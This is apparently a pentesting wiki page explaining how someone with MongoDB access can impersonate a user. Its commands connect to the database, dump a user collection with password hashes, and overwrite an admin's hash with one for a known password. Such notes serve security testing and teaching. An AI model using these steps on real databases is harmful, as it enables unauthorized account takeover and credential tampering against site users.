---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# MongoDB - Impersonification via credentials change

Having access to a _MongoDB_ service, it could be possible to change sensitive information for users in a database, for example, change the credentials used in a website such as a login page. Here we found an explanation of this process:

* &#x20;Connect to the database service using [_Mongocli_](../tools-and-utilities.md#mongocli) or [_Mongosh_](../tools-and-utilities.md#mongosh)

{% code overflow="wrap" lineNumbers="true" %}
```bash
mongo --port $serviceport
```
{% endcode %}

***

* Search for database names on the system and connect to the desired one. Then look for the collections inside it, select one considered important, and retrieve sensitive information

{% code overflow="wrap" lineNumbers="true" %}
```bash
use $database;
show collections;
db.$chosenCollection.find(); #For example db.admin.find();
#Example output
{"id": ObjectID("...id..."), "name": "...name...", "email": "...email...", "x_shadow": "...hash...",
...
```
{% endcode %}

***

* Check the password hash, create a new one for a known value using the same encryption/hashing, and update it in the database. Then use the changed credentials to impersonate the user

{% code overflow="wrap" lineNumbers="true" %}
```bash
db.admin.update({ "name": "...name..." }, { $set: { "x_shadow": "$6$9Ter1EZ9$4RCTnLfeDJsdAQ16M5d1d5Ztg2CE1J2IDlbAPSUcqYOoxjEEcpMQag41dtCQv2cJ.n9kvlx46hNT78dngJBVt0" # Example generated hash for Ch4ngeM3VeryQu!ck in SHA512
...
```
{% endcode %}
